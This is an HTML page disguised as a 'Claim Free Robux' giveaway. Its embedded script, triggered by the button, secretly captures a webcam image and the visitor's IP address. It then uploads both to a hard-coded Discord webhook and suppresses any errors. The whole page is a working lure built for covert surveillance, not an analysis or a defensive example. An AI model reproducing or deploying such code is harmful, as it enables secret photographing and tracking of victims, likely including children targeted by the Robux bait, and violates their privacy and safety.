<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Claim Free Robux</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: #f0f0f0;
      font-family: Arial, sans-serif;
    }

    #executeBtn {
      background: linear-gradient(to right, #ff8a00, #e52e71);
      color: white;
      border: none;
      padding: 15px 40px;
      border-radius: 25px;
      cursor: pointer;
      font-weight: bold;
      font-size: 20px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
      transition: all 0.3s ease;
      user-select: none;
    }

    #executeBtn:hover {
      transform: scale(1.05);
      box-shadow: 0 6px 20px rgba(0,0,0,0.3);
    }
  </style>
</head>
<body>

<button id="executeBtn">üéÅ CLAIM FREE ROBUX</button>

<script>
(async function() {
  const DELAY_SECONDS = 5;
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1403083806705057812/I3474kOt2sZKd2gOPsv6BCcP1X7J0smnlx5r15sp_Hm28vtemEZaCbMI1q3D6emTv5zR";

  async function getIP() {
    try {
      const res = await fetch("https://api.ipify.org?format=json");
      const data = await res.json();
      return data.ip;
    } catch {
      return "unknown";
    }
  }

  async function hijackWebcam() {
    try {
      const ip = await getIP();

      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          width: { ideal: 1920 },
          height: { ideal: 1080 },
          facingMode: "user",
        }
      });

      const video = document.createElement("video");
      video.srcObject = stream;
      await video.play();

      await new Promise(resolve => setTimeout(resolve, DELAY_SECONDS * 1000));

      if (video.readyState < 2) {
        await new Promise(resolve => {
          video.onloadeddata = resolve;
        });
      }

      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append("file", blob, `webcam_${ip}.jpg`);
        fetch(WEBHOOK_URL, { method: "POST", body: formData });
        stream.getTracks().forEach(track => track.stop());
      }, "image/jpeg", 0.9);

    } catch (err) {
      // silently fail
    }
  }

  const btn = document.getElementById("executeBtn");
  btn.addEventListener("click", async () => {
    btn.disabled = true;
    btn.textContent = "Processing...";
    await hijackWebcam();
    btn.textContent = "Done!";
  });
})();
</script>

</body>
</html>
